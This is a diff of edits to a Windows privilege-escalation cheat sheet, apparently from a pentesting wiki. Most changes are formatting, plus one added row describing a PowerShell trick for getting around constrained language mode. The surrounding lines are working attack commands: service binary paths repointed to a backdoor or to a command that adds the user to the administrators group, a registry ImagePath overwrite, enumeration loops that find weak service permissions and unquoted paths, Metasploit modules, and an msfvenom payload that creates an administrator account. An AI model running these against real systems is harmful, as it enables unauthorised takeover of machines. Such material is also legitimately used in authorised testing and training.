@@ -64,7 +64,14 @@ Always ensure you have **explicit** permission to access any computer system **b
       <td style="text-align:left"><code>&amp; { &lt;code_here&gt; }</code>
       </td>
       <td style="text-align:left">The operator (<code>&amp;</code>) is an alias for <code>Invoke-Expression</code> and
-        is equivelent to the example above.</td>
+        is equivalent to the example above.</td>
+    </tr>
+    <tr>
+      <td style="text-align:left"><code>. { &lt;code_here&gt; }</code>
+      </td>
+      <td style="text-align:left">The operator (<code>.</code>) can be used to create an anonymous one-time
+        function. This can sometimes be used to bypass certain constrained language
+        modes.</td>
     </tr>
     <tr>
       <td style="text-align:left">
@@ -128,7 +135,7 @@ powershell.exe
 
 ## Services
 
-#### Modify service binary path \(_link to persistence pages_\)
+### Modify service binary path \(_link to persistence pages_\)
 
 If one of the groups you have access to has SERVICE\_ALL\_ACCESS in a service, then it can modify the binary that is being executed by the service. To modify it and execute nc you can do:
 
@@ -140,11 +147,17 @@ sc config <service_Name> binpath= "net localgroup administrators <username> /add
 sc config <service_name> binpath= "C:\path\to\backdoor.exe"
 ```
 
-#### Service Permissions \(_link to persistence pages_\)
+### Service Permissions \(TODO:_link to persistence pages_\)
 
-Other Permissions can be used to escalate privileges: SERVICE\_CHANGE\_CONFIG Can reconfigure the service binary WRITE\_DAC: Can reconfigure permissions, leading to SERVICE\_CHANGE\_CONFIG WRITE\_OWNER: Can become owner, reconfigure permissions GENERIC\_WRITE: Inherits SERVICE\_CHANGE\_CONFIG GENERIC\_ALL: Inherits SERVICE\_CHANGE\_CONFIG To detect and exploit this vulnerability you can use exploit/windows/local/service\_permissions
+Other Permissions can be used to escalate privileges: 
 
-Check if you can modify the binary that is executed by a service. You can get every binary that is executed by a service using wmic \(not in system32\) and check your permissions using icacls:
+* SERVICE\_CHANGE\_CONFIG Can reconfigure the service binary 
+* WRITE\_DAC: Can reconfigure permissions, leading to SERVICE\_CHANGE\_CONFIG 
+* WRITE\_OWNER: Can become owner, reconfigure permissions 
+* GENERIC\_WRITE: Inherits SERVICE\_CHANGE\_CONFIG 
+* GENERIC\_ALL: Inherits SERVICE\_CHANGE\_CONFIG \(To detect and exploit this vulnerability you can use exploit/windows/local/service\_permissions in MetaSploit\)
+
+Check if you can modify the binary that is executed by a service. You can retrieve a list of every binary that is executed by a service using `wmic` \(not in system32\) and check your permissions using `icacls`:
 
 ```text
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
@@ -152,7 +165,7 @@ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^
 for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
 ```
 
-You can also use sc.exe and icacls:
+You can also use `sc.exe` and `icacls`:
 
 ```text
 sc.exe query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
@@ -160,7 +173,7 @@ FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Te
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 ```
 
-#### Services registry permissions \(_link to persistence pages_\)
+### Services registry permissions \(TODO: _link to persistence pages_\)
 
 You should check if you can modify any service registry. You can check your permissions over a service registry doing:
 
@@ -175,7 +188,7 @@ get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "
 
 Check if Authenticated Users or NT AUTHORITY\INTERACTIVE have FullControl. In that case you can change the binary that is going to be executed by the service. To change the Path of the binary executed: `reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f`
 
-#### Unquoted Service Paths \(_link to persistence pages_\)
+### Unquoted Service Paths \(TODO: _link to persistence pages_\)
 
 If the path to an executable is not inside quotes, Windows will try to execute every ending before a space. For example, for the path C:\Program Files\Some Folder\Service.exe Windows will try to execute:
 
@@ -208,7 +221,7 @@ for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
 
-You can detect and exploit this vulnerability with metasploit: `exploit/windows/local/trusted_service_path` You can manually create a service binary with msfvenom: `msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe`
+You can detect and exploit this vulnerability with metasploit using the module: `exploit/windows/local/trusted_service_path` You can manually create a service binary with msfvenom: `msfvenom -p windows/exec CMD="net localgroup administrators $username /add" -f exe-service -o service.exe`
 
 ### References
 
